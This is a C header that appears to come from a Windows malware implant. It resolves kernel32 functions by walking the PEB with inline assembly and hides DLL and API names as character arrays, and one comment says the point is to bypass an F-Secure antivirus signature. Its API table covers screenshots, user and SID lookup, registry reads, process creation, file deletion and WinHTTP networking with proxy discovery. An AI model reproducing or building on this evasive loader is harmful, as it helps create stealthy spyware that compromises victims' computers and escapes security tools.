#ifndef _API_H
#define _API_H

#include <windows.h>
#include <Winhttp.h>

// todo: fix case
/* WinHTTP */
typedef BOOL (WINAPI *WINHTTPSENDREQUEST)(_In_ HINTERNET hRequest, _In_opt_  LPCWSTR pwszHeaders, _In_ DWORD dwHeadersLength,_In_opt_  LPVOID lpOptional,  _In_ DWORD dwOptionalLength, _In_ DWORD dwTotalLength,_In_ DWORD_PTR dwContext);
typedef BOOL (WINAPI *WINHTTPGETIEPROXYCONFIGFORCURRENTUSER)(_Inout_  WINHTTP_CURRENT_USER_IE_PROXY_CONFIG *pProxyConfig);
typedef BOOL (WINAPI *WINHTTPSETOPTION)(_In_  HINTERNET hInternet, _In_  DWORD dwOption, _In_  LPVOID lpBuffer, _In_  DWORD dwBufferLength);
typedef BOOL (WINAPI *WINHTTPSETTIMEOUTS)(_In_  HINTERNET hInternet,_In_  int dwResolveTimeout,_In_  int dwConnectTimeout, _In_  int dwSendTimeout, _In_  int dwReceiveTimeout);
typedef BOOL (WINAPI *WINHTTPRECEIVERESPONSE)(_In_ HINTERNET hRequest, LPVOID lpReserved);
typedef HINTERNET (WINAPI *WINHTTPCONNECT)(_In_ HINTERNET hSession,_In_ LPCWSTR pswzServerName,_In_ INTERNET_PORT nServerPort,DWORD dwReserved);
typedef HINTERNET (WINAPI *WINHTTPOPEN)(_In_opt_ LPCWSTR pwszUserAgent,_In_ DWORD dwAccessType, _In_ LPCWSTR pwszProxyName, _In_ LPCWSTR pwszProxyBypass, _In_ DWORD dwFlags);
typedef HINTERNET (WINAPI *WINHTTPOPENREQUEST)(_In_  HINTERNET hConnect, _In_  LPCWSTR pwszVerb, _In_  LPCWSTR pwszObjectName, _In_  LPCWSTR pwszVersion, _In_  LPCWSTR pwszReferrer, _In_  LPCWSTR *ppwszAcceptTypes, _In_  DWORD dwFlags);
typedef BOOL (WINAPI *WINHTTPGETPROXYFORURL)(_In_   HINTERNET hSession, _In_   LPCWSTR lpcwszUrl, _In_   WINHTTP_AUTOPROXY_OPTIONS *pAutoProxyOptions, _Out_  WINHTTP_PROXY_INFO *pProxyInfo);
typedef BOOL (WINAPI *WINHTTPREADDATA)(_In_   HINTERNET hRequest, _Out_  LPVOID lpBuffer, _In_   DWORD dwNumberOfBytesToRead, _Out_  LPDWORD lpdwNumberOfBytesRead);
typedef BOOL (WINAPI *WINHTTPCLOSEHANDLE)(_In_  HINTERNET hInternet);
typedef BOOL (WINAPI *WINHTTPQUERYHEADERS)(_In_      HINTERNET hRequest,_In_      DWORD dwInfoLevel, _In_opt_  LPCWSTR pwszName, _Out_     LPVOID lpBuffer,  _Inout_   LPDWORD lpdwBufferLength,  _Inout_   LPDWORD lpdwIndex);

typedef struct _DYNAMIC_WINHTTP
{
	WINHTTPSENDREQUEST fpWinHttpSendRequest;
	WINHTTPGETIEPROXYCONFIGFORCURRENTUSER fpWinhttpgetieproxyconfigforcurrentuser;
	WINHTTPSETOPTION fpWinhttpsetoption;
	WINHTTPSETTIMEOUTS fpWinhttpsettimeouts;
	WINHTTPRECEIVERESPONSE fpWinhttpreceiveresponse;
	WINHTTPCONNECT fpWinhttpconnect;
	WINHTTPOPEN fpWinhttpopen;
	WINHTTPOPENREQUEST fpWinhttpopenrequest;
	WINHTTPGETPROXYFORURL fpWinhttpgetproxyforurl;
	WINHTTPREADDATA fpWinhttpreaddata;
	WINHTTPCLOSEHANDLE fpWinhttpclosehandle;
	WINHTTPQUERYHEADERS fpWinhttpqueryheaders;

} DYNAMIC_WINHTTP, *PDYNAMIC_WINHTTP;


/* Winsock */
typedef int (*WSASTARTUP)( _In_   WORD wVersionRequested, _Out_  LPWSADATA lpWSAData); //WSAStartup
//typedef unsigned long (*INET_ADDR)(_In_  const char *cp); // inet_addr        
typedef unsigned long (PASCAL FAR *INET_ADDR)(__in const char FAR * cp); //inet_addr
//typedef struct hostent* FAR (*GETHOSTBYNAME)(_In_  const char *name); //gethostbyname
typedef struct hostent FAR * (PASCAL FAR *GETHOSTBYNAME)(const char FAR * name);
typedef char* FAR (*INET_NTOA)( _In_  struct   in_addr in); //  inet_ntoa
typedef int (*WSACLEANUP)(void); //WSACleanup
typedef u_long (PASCAL FAR *NTOHL)(_In_  u_long netlong);
//typedef u_long (*NTOHL)(_In_  u_long netlong); //ntohl


typedef struct _DYNAMIC_WINSOCK
{
	WSASTARTUP fpWSAStartup;
	WSACLEANUP fpWSACleanup;
	INET_ADDR fpinet_addr;
	GETHOSTBYNAME fpgethostbyname;
	INET_NTOA fpinet_ntoa;
	NTOHL fpntohl;
} DYNAMIC_WINSOCK, *PDYNAMIC_WINSOCK;

BOOL API_LoadWinsock(PDYNAMIC_WINSOCK* pDynamicWinsock);
BOOL API_LoadWinHttp(PDYNAMIC_WINHTTP* pDynamicWinHttp);

/*
#include <Winhttp.h>
#include <Lm.h>
#include <gdiplus.h>
using namespace Gdiplus;


typedef WINHTTP_CURRENT_USER_IE_PROXY_CONFIG *PWINHTTP_CURRENT_USER_IE_PROXY_CONFIG;
typedef WINHTTP_AUTOPROXY_OPTIONS *PWINHTTP_AUTOPROXY_OPTIONS;
typedef WINHTTP_PROXY_INFO *PWINHTTP_PROXY_INFO;

typedef BOOL (WINAPI *CLOSEHANDLE)(HANDLE);
typedef BOOL (WINAPI *READFILE)(HANDLE, PVOID, ULONG, PULONG, LPOVERLAPPED);
typedef DWORD (WINAPI *GETFILESIZE)(HANDLE, PULONG);
typedef HANDLE (WINAPI *CREATEFILE)(LPWSTR, ULONG, ULONG, LPSECURITY_ATTRIBUTES, ULONG, ULONG, HANDLE);
typedef HANDLE (WINAPI *CREATEFILEA)(LPSTR, ULONG, ULONG, LPSECURITY_ATTRIBUTES, ULONG, ULONG, HANDLE);
typedef BOOL (WINAPI *FINDCLOSE)(HANDLE);
typedef BOOL (WINAPI *FINDNEXTFILE)(HANDLE, PWIN32_FIND_DATA);
typedef HANDLE (WINAPI *FINDFIRSTFILE)(LPWSTR, PWIN32_FIND_DATA);
typedef BOOL (WINAPI *WRITEFILE)(HANDLE, PVOID, ULONG, PULONG, LPOVERLAPPED);
typedef VOID (WINAPI *GETSYSTIME)(PFILETIME);
typedef DWORD (WINAPI *WAITSINGLE)(HANDLE, ULONG);
typedef HANDLE (WINAPI *CREATETHREAD)(PSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, PVOID, DWORD, PULONG);
typedef DWORD (WINAPI *GETCURPROCID)();
typedef VOID (WINAPI *SLEEP)(ULONG);
typedef DWORD (WINAPI *GETLASTERR)();
typedef VOID (WINAPI *EXITPROC)(ULONG);
typedef BOOL (WINAPI *CREATEPROCA)(LPSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, ULONG, PVOID, LPSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *CREATEPROC)(LPWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, ULONG, PVOID, LPWSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *DELETEFILE)(LPWSTR);
typedef ULONG (WINAPI *GETTICKCOUNT)();
typedef ULONG (WINAPI *GETNENVVARA)(LPSTR, LPSTR, ULONG);
typedef HLOCAL (WINAPI *LOCALFREE)(HLOCAL);
typedef LONG (WINAPI *COMPAREFILETIME)(PFILETIME, PFILETIME);
typedef HGLOBAL (WINAPI *GLOBALALLOC)(ULONG, SIZE_T);
typedef PVOID (WINAPI *GLOBALLOCK)(HGLOBAL);
typedef HGLOBAL (WINAPI *GLOBALFREE)(HGLOBAL);
typedef BOOL (WINAPI *GLOBALUNLOCK)(HGLOBAL);
typedef VOID (WINAPI *GETNATIVEINFO)(LPSYSTEM_INFO);
typedef BOOL (WINAPI *GLOBALMEMSTAT)(LPMEMORYSTATUSEX);
typedef VOID (WINAPI *GETSYSINFO)(LPSYSTEM_INFO);
typedef ULONG (WINAPI *GETLOCALEINFO)(LCID, LCTYPE, LPWSTR, ULONG);
typedef ULONG (WINAPI *GETNENVVAR)(LPWSTR, LPWSTR, ULONG);
typedef BOOL (WINAPI *GETFREEDISK)(LPWSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef HANDLE (WINAPI *GETCURRPROC)();
typedef BOOL (WINAPI *ISWOW64)(HANDLE, PBOOL);
typedef VOID (WINAPI *OUTPUTDEBUGA)(LPSTR);
typedef VOID (WINAPI *OUTPUTDEBUG)(LPWSTR);
typedef ULONG (WINAPI *GETMODULENAMEA)(HMODULE, LPSTR, ULONG);
typedef ULONG (WINAPI *GETMODULENAME)(HMODULE, LPWSTR, ULONG);
typedef HMODULE (WINAPI *GETMODULEHA)(LPSTR);
typedef HMODULE (WINAPI *GETMODULEH)(LPWSTR);
typedef ULONG (WINAPI *STRLENA)(LPSTR);
typedef ULONG (WINAPI *STRLENW)(LPWSTR);
typedef BOOL (WINAPI *GETWINDOWINFO)(HWND, PWINDOWINFO);
typedef HWND (WINAPI *GETDESKWINDOW)();
typedef HDC (WINAPI *GETDC)(HWND);
typedef ULONG (WINAPI *RELEASEDC)(HWND, HDC);
typedef ULONG (WINAPI *MESSAGEBOX)(HWND, LPWSTR, LPWSTR, ULONG);
typedef BOOL (WINAPI *GETLASTINPUT)(PLASTINPUTINFO);
typedef HWND (WINAPI *GETFOREWIN)();
typedef HBITMAP (WINAPI *CREATECOMPBIT)(HDC, ULONG, ULONG);
typedef HGDIOBJ (WINAPI *SELECTOBJ)(HDC, HGDIOBJ);
typedef BOOL (WINAPI *STRETCHBLTF)(HDC, INT, INT, INT, INT, HDC, INT, INT, INT, INT, DWORD);
typedef INT (WINAPI *GETDLBITS)(HDC, HBITMAP, UINT, UINT, PVOID, LPBITMAPINFO, UINT);
typedef BOOL (WINAPI *DELETEOBJ)(HGDIOBJ);
typedef BOOL (WINAPI *DELETEDC)(HDC);
typedef HDC (WINAPI *CREATECOMPDC)(HDC);
typedef BOOL (WINAPI *GETTOKENINFO)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, DWORD, PDWORD);
typedef BOOL (WINAPI *SIDTOSTRINGA)(PSID, LPSTR);
typedef BOOL (WINAPI *SIDTOSTRING)(PSID, LPWSTR);
typedef LONG (WINAPI *REGENUMKEY)(HKEY, DWORD, LPWSTR, PDWORD, PDWORD, LPWSTR, PDWORD, PFILETIME);
typedef LONG (WINAPI *REGOPENKEY)(HKEY, LPWSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *REGQUERYVAL)(HKEY, LPWSTR, PDWORD, PDWORD, PBYTE, PDWORD);
typedef LONG (WINAPI *REGCLOSEKEY)(HKEY);
typedef BOOL (WINAPI *GETUSERNAME)(LPWSTR, PDWORD);
typedef BOOL (WINAPI *OPENPROCTOKEN)(HANDLE, DWORD, PHANDLE);
typedef HRESULT (WINAPI *COINITIALIZE)(PVOID);
typedef HRESULT (WINAPI *CREATESTREAMOG)(HGLOBAL, BOOL, LPSTREAM);
typedef VOID (WINAPI *COUNINITIALIZE)();
typedef BOOL (WINAPI *WINHTTPGETRESP)(HINTERNET, PVOID);
typedef BOOL (WINAPI *WINHTTPREAD)(HINTERNET, PVOID, DWORD, PDWORD);
typedef HINTERNET (WINAPI *WINHTTPOPEN)(LPWSTR, DWORD, LPWSTR, LPWSTR, DWORD);
typedef BOOL (WINAPI *WINHTTPPROXYC)(PWINHTTP_CURRENT_USER_IE_PROXY_CONFIG);
typedef BOOL (WINAPI *WINHTTPPROXYU)(HINTERNET, LPWSTR, PWINHTTP_AUTOPROXY_OPTIONS, PWINHTTP_PROXY_INFO);
typedef BOOL (WINAPI *WINHTTPSETOPT)(HINTERNET, DWORD, PVOID, DWORD);
typedef HINTERNET (WINAPI *WINHTTPCONNECT)(HINTERNET, LPWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *WINHTTPOPENREQ)(HINTERNET, LPWSTR, LPWSTR, LPWSTR, LPWSTR, LPWSTR, DWORD);
typedef BOOL (WINAPI *WINHTTPSETTIME)(HINTERNET, INT, INT, INT, INT);
typedef BOOL (WINAPI *WINHTTPSENDREQ)(HINTERNET, LPWSTR, DWORD, PVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *WINHTTPCLOSEH)(HINTERNET);
typedef BOOL (WINAPI *WINHTTPQUERYH)(HINTERNET, DWORD, LPWSTR, PVOID, PDWORD, PDWORD);
typedef NET_API_STATUS (WINAPI *NETAPIBUFFFREE)(PVOID);
typedef NET_API_STATUS (WINAPI *NETUSERGETINFO)(LPWSTR, LPWSTR, DWORD, PBYTE);
typedef VOID (WINAPI *GDISHUTDOWN)(ULONG_PTR);
typedef Status (WINAPI *GDIPLUSSTART)(PVOID, PVOID, PVOID);

typedef ULONG (__stdcall *WCSNCATS)(PWCHAR, SIZE_T, PWCHAR, SIZE_T);
typedef INT (__stdcall *WCSCMP)(PWCHAR, PWCHAR);
typedef VOID (__stdcall *QSORT)(PVOID, SIZE_T, SIZE_T, INT (__cdecl *compare )(PVOID, PVOID));
typedef INT (__stdcall *SNPRINTFS)(PCHAR, SIZE_T, SIZE_T, PCHAR, ...);
typedef INT (__stdcall *WCSCATS)(PWCHAR, SIZE_T, PWCHAR);
typedef INT (__stdcall *SWPRINTFS)(PWCHAR, PWCHAR, ...);
typedef INT (__stdcall *MEMCMP)(PVOID, PVOID, SIZE_T);
typedef INT (__stdcall *RAND)();
typedef VOID (__stdcall *SRAND)(ULONG);
typedef INT (__stdcall *ITOWS)(INT, PWCHAR, SIZE_T, INT);
typedef PVOID (__stdcall *REALLOC)(PVOID, SIZE_T);
typedef INT (__stdcall *WTOI)(WCHAR);
typedef INT (__stdcall *SSCANFS)(PCHAR, PCHAR, ...);
typedef PVOID (__stdcall *MEMCPY)(PVOID, PVOID, SIZE_T);
typedef VOID (__stdcall *FREE)(PVOID);
typedef VOID (__stdcall *MEMSET)(PVOID, INT, SIZE_T);
typedef PVOID (__stdcall *MALLOC)(SIZE_T);
typedef PCHAR (__stdcall *STRCHR)(PCHAR, INT);
typedef INT (__stdcall *WCSCPYS)(PWCHAR, SIZE_T, PWCHAR);
typedef INT (__stdcall *ISALNUM)(INT);
typedef INT (__stdcall *SNWPRINTFS)(PWCHAR, SIZE_T, SIZE_T, PWCHAR, ...);
typedef INT (__stdcall *ABS)(INT);
typedef SIZE_T (__stdcall *WCSLEN)(PWCHAR);
typedef INT (__stdcall *WCSNCPYS)(PWCHAR, SIZE_T, PWCHAR, SIZE_T);

typedef HMODULE (WINAPI *LOADLIBRARYA)(LPSTR);
typedef HMODULE (WINAPI *LOADLIBRARY)(LPWSTR);
typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPSTR);

typedef struct _MY_WINAPI
{
	LOADLIBRARYA	LoadLibraryA;
	GETPROCADDRESS	GetProcAddressA;
	LOADLIBRARY		LoadLibrary;
	CLOSEHANDLE		CloseHandle;
	READFILE		ReadFile;
	GETFILESIZE		GetFileSize;
	CREATEFILE		CreateFile;
	CREATEFILEA		CreateFileA;
	FINDCLOSE		FindClose;
	FINDNEXTFILE	FindNextFile;
	FINDFIRSTFILE	FindFirstFile;
	WRITEFILE		WriteFile;
	GETSYSTIME		GetSystemTimeAsFileTime;
	WAITSINGLE		WaitForSingleObject;
	CREATETHREAD	CreateThread;
	GETCURPROCID	GetCurrentProcessId;
	SLEEP			Sleep;
	GETLASTERR		GetLastError;
	EXITPROC		ExitProcess;
	CREATEPROCA		CreateProcessA;
	CREATEPROC		CreateProcess;
	DELETEFILE		DeleteFile;
	GETTICKCOUNT	GetTickCount;
	GETNENVVARA		GetEnvironmentVariableA;
	GETNENVVAR		GetEnvironmentVariable;
	LOCALFREE		LocalFree;
	COMPAREFILETIME	CompareFileTime;
	GLOBALALLOC		GlobalAlloc;
	GLOBALLOCK		GlobalLock;
	GLOBALFREE		GlobalFree;
	GLOBALUNLOCK	GlobalUnlock;
	GETNATIVEINFO	GetNativeSystemInfo;
	GLOBALMEMSTAT	GlobalMemoryStatusEx;
	GETSYSINFO		GetSystemInfo;
	GETLOCALEINFO	GetLocaleInfo;
	GETFREEDISK		GetDiskFreeSpaceEx;
	GETCURRPROC		GetCurrentProcess;
	ISWOW64			IsWow64Process;
	OUTPUTDEBUGA	OutputDebugStringA;
	OUTPUTDEBUG		OutputDebugString;
	GETMODULENAMEA	GetModuleFileNameA;
	GETMODULENAME	GetModuleFileName;
	GETMODULEHA		GetModuleHandleA;
	GETMODULEH		GetModuleHandle;
	STRLENA			lstrlenA;
	STRLENW			lstrlenW;
	GETWINDOWINFO	GetWindowInfo;
	GETDESKWINDOW	GetDesktopWindow;
	GETDC			GetDC;
	RELEASEDC		ReleaseDC;
	MESSAGEBOX		MessageBox;
	GETLASTINPUT	GetLastInputInfo;
	GETFOREWIN		GetForegroundWindow;
	CREATECOMPBIT	CreateCompatibleBitmap;
	SELECTOBJ		SelectObject;
	STRETCHBLTF		StretchBlt;
	GETDLBITS		GetDIBits;
	DELETEOBJ		DeleteObject;
	DELETEDC		DeleteDC;
	CREATECOMPDC	CreateCompatibleDC;
	GETTOKENINFO	GetTokenInformation;
	SIDTOSTRINGA	ConvertSidToStringSidA;
	SIDTOSTRING		ConvertSidToStringSid;
	REGENUMKEY		RegEnumKeyEx;
	REGOPENKEY		RegOpenKeyEx;
	REGQUERYVAL		RegQueryValueEx;
	REGCLOSEKEY		RegCloseKey;
	GETUSERNAME		GetUserName;
	OPENPROCTOKEN	OpenProcessToken;
	COINITIALIZE	CoInitialize;
	CREATESTREAMOG	CreateStreamOnHGlobal;
	COUNINITIALIZE	CoUninitialize;
	WINHTTPGETRESP	WinHttpReceiveResponse;
	WINHTTPREAD		WinHttpReadData;
	WINHTTPOPEN		WinHttpOpen;
	WINHTTPPROXYC	WinHttpGetIEProxyConfigForCurrentUser;
	WINHTTPPROXYU	WinHttpGetProxyForUrl;
	WINHTTPSETOPT	WinHttpSetOption;
	WINHTTPCONNECT	WinHttpConnect;
	WINHTTPOPENREQ	WinHttpOpenRequest;
	WINHTTPSETTIME	WinHttpSetTimeouts;
	WINHTTPSENDREQ	WinHttpSendRequest;
	WINHTTPCLOSEH	WinHttpCloseHandle;
	WINHTTPQUERYH	WinHttpQueryHeaders;
	NETAPIBUFFFREE	NetApiBufferFree;
	NETUSERGETINFO	NetUserGetInfo;
	GDISHUTDOWN		GdiplusShutdown;
	GDIPLUSSTART	GdiplusStartup;

	WCSNCATS		wcsncat_s;
	WCSCATS			wcscat_s;
	WCSCMP			wcscmp;
	QSORT			qsort;
	SNPRINTFS		_snprintf_s;
	SWPRINTFS		swprintf_s;
	MEMCMP			memcmp;
	RAND			rand;
	SRAND			srand;
	ITOWS			_itow_s;
	REALLOC			realloc;
	WTOI			_wtoi;
	SSCANFS			sscanf_s;
	MEMCPY			memcpy;
	FREE			free;
	MEMSET			memset;
	MALLOC			malloc;
	STRCHR			strchr;
	WCSCPYS			wcscpy_s;
	ISALNUM			isalnum;
	SNWPRINTFS		_snwprintf_s;
	ABS				abs;
	WCSLEN			wcslen;
	WCSNCPYS		wcsncpy_s;

} MY_WINAPI, *PMY_WINAPI;


__forceinline PMY_WINAPI InitApi();
__forceinline VOID SolveApi(PMY_WINAPI pWinApi);
__forceinline PVOID Resolve(PMY_WINAPI pWinApi, PCHAR pDllName, PCHAR pFuncName);



typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct {
	DWORD InLoadNext;
	DWORD InLoadPrev;
	DWORD InMemNext;
	DWORD InMemPrev;
	DWORD InInitNext;
	DWORD InInitPrev;
	DWORD ImageBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;

__forceinline int my_strcmpi(PCHAR _src1, PCHAR _src2);
__forceinline void my_toupper(PCHAR c);


//#pragma comment(linker, "/EXPORT:pWinApi=?pWinApi@@3PAU_MY_WINAPI@@A")
__declspec(dllexport) MY_WINAPI pWinApi;



__forceinline PMY_WINAPI InitApi()
{
	LOADLIBRARYA	pfn_LoadLibraryA = 0;
	GETPROCADDRESS	pfn_GetProcAddress = 0;
	GETMODULEHA		pfn_GetModuleHandleA  = 0;
	
	PPEB_LIST_ENTRY pHead;
	PDWORD *pPeb;
	PDWORD pLdr;
	
	__asm {
		mov eax, 30h
		mov eax,DWORD PTR fs:[eax]
		add eax, 08h
		mov ss:[pPeb], eax
	}
	
	pLdr = *(pPeb + 1);
	pHead = ((PPEB_LIST_ENTRY) *(pLdr + 3));
	
	PPEB_LIST_ENTRY pEntry = pHead;
	do 
	{		
		DWORD uImageBase = pEntry->ImageBase;	
		if (uImageBase == NULL)
			goto NEXT_ENTRY;
		
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) pEntry->ImageBase;
		PIMAGE_NT_HEADERS32 pNtHeaders = (PIMAGE_NT_HEADERS32) (pEntry->ImageBase + pDosHeader->e_lfanew);
		
		if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
			goto NEXT_ENTRY;
		
		PIMAGE_EXPORT_DIRECTORY pExportDirectory =  (PIMAGE_EXPORT_DIRECTORY) (uImageBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		PCHAR pModuleName = (PCHAR)(uImageBase + pExportDirectory->Name);
		if (pModuleName == NULL)
			goto NEXT_ENTRY;

		CHAR pKernel32Dll[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
		if (!my_strcmpi(pModuleName+1, pKernel32Dll+1) )  // +1 to bypass f-secure signature
		{
			if (pExportDirectory->AddressOfFunctions == NULL) 
				goto NEXT_ENTRY;
			if (pExportDirectory->AddressOfNames == NULL) 
				goto NEXT_ENTRY;
			if (pExportDirectory->AddressOfNameOrdinals == NULL) 
				goto NEXT_ENTRY;
			
			PDWORD pFunctions = (PDWORD) (uImageBase + pExportDirectory->AddressOfFunctions);
			PDWORD pNames = (PDWORD) (uImageBase + pExportDirectory->AddressOfNames);			
			PWORD pNameOrds = (PWORD) (uImageBase + pExportDirectory->AddressOfNameOrdinals);
			
			for (WORD x = 0; x < pExportDirectory->NumberOfFunctions; x++)
			{
				if (pFunctions[x] == 0)
					continue;
				
				for (WORD y = 0; y < pExportDirectory->NumberOfNames; y++)
				{
					if (pNameOrds[y] == x)
					{
						char *name = (char *) (uImageBase + pNames[y]);
						if (name == NULL)
							continue;
						
						CHAR pLoadLibraryW[] =  { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };
						CHAR pGetModuleHandleA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
						CHAR pGetProcAddress[] =  { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

						if (!my_strcmpi(pLoadLibraryW, name))
							pfn_LoadLibraryA = (LOADLIBRARYA) (uImageBase + pFunctions[x]);
						if (!my_strcmpi(pGetProcAddress, name))
							pfn_GetProcAddress = (GETPROCADDRESS) (uImageBase + pFunctions[x]);
						if (!my_strcmpi(pGetModuleHandleA, name))
							pfn_GetModuleHandleA = (GETMODULEHA) (uImageBase + pFunctions[x]);
						break;
					}
				}
			}
		}
NEXT_ENTRY:
		pEntry = (PEB_LIST_ENTRY *) pEntry->InLoadNext;
	} while (pEntry != pHead);

	CHAR pApiName[] = { '?', 'p', 'W', 'i', 'n', 'A', 'p', 'i', '@', '@', '3', 'U', '_', 'M', 'Y', '_', 'W', 'I', 'N', 'A', 'P', 'I', '@', '@', 'A', 0x0 };
	PMY_WINAPI pWinApi = (PMY_WINAPI)pfn_GetProcAddress(pfn_GetModuleHandleA(NULL), pApiName);

	pWinApi->LoadLibraryA = pfn_LoadLibraryA;
	pWinApi->GetProcAddressA = pfn_GetProcAddress;
	pWinApi->GetModuleHandleA = pfn_GetModuleHandleA;

	SolveApi(pWinApi);

	return pWinApi;
}

__forceinline PVOID Resolve(PMY_WINAPI pWinApi, PCHAR pDllName, PCHAR pFuncName)
{
	return pWinApi->GetProcAddressA(pWinApi->LoadLibraryA(pDllName), pFuncName);
}

__forceinline VOID SolveApi(PMY_WINAPI pWinApi)
{
	// KERNEL32 
	CHAR pKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };

	CHAR pCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 };
	pWinApi->CloseHandle = (CLOSEHANDLE)Resolve(pWinApi, pKernel32, pCloseHandle);
	CHAR pReadFile[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x0 };
	pWinApi->ReadFile = (READFILE)Resolve(pWinApi, pKernel32, pReadFile);
	CHAR pGetFileSize[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x0 };
	pWinApi->GetFileSize = (GETFILESIZE)Resolve(pWinApi, pKernel32, pGetFileSize);
	CHAR pCreateFileW[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0x0 };
	pWinApi->CreateFile = (CREATEFILE)Resolve(pWinApi, pKernel32, pCreateFileW);
	CHAR pCreateFileA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 };
	pWinApi->CreateFileA = (CREATEFILEA)Resolve(pWinApi, pKernel32, pCreateFileA);
	CHAR pFindClose[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', 0x0 };
	pWinApi->FindClose = (FINDCLOSE)Resolve(pWinApi, pKernel32, pFindClose);
	CHAR pFindNextFileW[] = { 'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', 'W', 0x0 };
	pWinApi->FindNextFile = (FINDNEXTFILE)Resolve(pWinApi, pKernel32, pFindNextFileW);
	CHAR pFindFirstFileW[] = { 'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'W', 0x0 };
	pWinApi->FindFirstFile = (FINDFIRSTFILE)Resolve(pWinApi, pKernel32, pFindFirstFileW);
	CHAR pWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 };
	pWinApi->WriteFile = (WRITEFILE)Resolve(pWinApi, pKernel32, pWriteFile);
	CHAR pGetSystemTimeAsFileTime[] = { 'G', 'e', 't', 'S', 'y', 's', 't', 'e', 'm', 'T', 'i', 'm', 'e', 'A', 's', 'F', 'i', 'l', 'e', 'T', 'i', 'm', 'e', 0x0 };
	pWinApi->GetSystemTimeAsFileTime = (GETSYSTIME)Resolve(pWinApi, pKernel32, pGetSystemTimeAsFileTime);
	CHAR pWaitForSingleObject[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0x0 };
	pWinApi->WaitForSingleObject = (WAITSINGLE)Resolve(pWinApi, pKernel32, pWaitForSingleObject);
	CHAR pCreateThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
	pWinApi->CreateThread = (CREATETHREAD)Resolve(pWinApi, pKernel32, pCreateThread);
	CHAR pGetCurrentProcessId[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', 0x0 };
	pWinApi->GetCurrentProcessId = (GETCURPROCID)Resolve(pWinApi, pKernel32, pGetCurrentProcessId);
	CHAR pSleep[] = { 'S', 'l', 'e', 'e', 'p', 0x0 };
	pWinApi->Sleep = (SLEEP)Resolve(pWinApi, pKernel32, pSleep);
	CHAR pGetLastError[] = { 'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0x0 };
	pWinApi->GetLastError = (GETLASTERR)Resolve(pWinApi, pKernel32, pGetLastError);
	CHAR pExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	pWinApi->ExitProcess = (EXITPROC)Resolve(pWinApi, pKernel32, pExitProcess);
	CHAR pCreateProcessA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x0 };
	pWinApi->CreateProcessA = (CREATEPROCA)Resolve(pWinApi, pKernel32, pCreateProcessA);
	CHAR pCreateProcessW[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'W', 0x0 };
	pWinApi->CreateProcess = (CREATEPROC)Resolve(pWinApi, pKernel32, pCreateProcessW);
	CHAR pDeleteFileW[] = { 'D', 'e', 'l', 'e', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0x0 };
	pWinApi->DeleteFile = (DELETEFILE)Resolve(pWinApi, pKernel32, pDeleteFileW);
	CHAR pGetTickCount[] = { 'G', 'e', 't', 'T', 'i', 'c', 'k', 'C', 'o', 'u', 'n', 't', 0x0 };
	pWinApi->GetTickCount = (GETTICKCOUNT)Resolve(pWinApi, pKernel32, pGetTickCount);
